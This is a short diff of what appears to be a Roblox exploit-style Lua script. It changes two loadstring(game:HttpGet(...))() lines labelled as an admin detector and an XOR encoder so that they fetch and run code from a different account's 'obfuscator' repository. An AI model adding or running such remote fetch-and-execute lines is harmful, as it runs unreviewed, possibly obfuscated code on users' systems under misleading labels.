@@ -10,7 +10,7 @@ end)
 
 
 ---Admin Detector in Server
-loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Admin'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Showcaser1/obfuscator/refs/heads/main/das'))()
 ---
 
 
@@ -19,7 +19,7 @@ local encodedScript = xorEncode("Script Here") --use this to encode script
 local decodedScript = xorDecode("Script Here") --use this to decode script
 load(encodedScript) --use this to load the encoded script
 ]]
-loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/XOR Encoder Source'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Showcaser1/obfuscator/refs/heads/main/addwas'))()
 --
 
 
